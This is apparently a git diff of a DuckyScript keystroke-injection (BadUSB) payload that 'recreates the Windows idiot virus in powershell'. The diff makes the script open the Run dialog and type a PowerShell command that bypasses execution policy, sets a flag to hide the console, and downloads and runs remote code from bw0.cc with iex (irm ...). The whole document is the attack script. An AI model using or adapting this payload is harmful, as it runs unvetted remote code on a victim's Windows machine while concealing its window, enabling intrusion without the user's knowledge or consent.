@@ -4,14 +4,13 @@ REM Author: @beigeworm
 REM Description: This script recreates the Windows idiot virus in powershell
 REM Target: Windows 10
 
-REM some setup for dukie script
-DEFAULT_DELAY 100
+REM To hide the console, use $hide='y' below. 
 
-REM open powershell (remove -W Hidden to show the window)
+REM open powershell
 DELAY 1000
 GUI r
 DELAY 750
-STRING powershell -Ep Bypass -C iex (irm bw0.cc/idiot)
+STRING powershell -Ep Bypass -C $hide='y'; iex (irm bw0.cc/idiot)
 ENTER
 
 
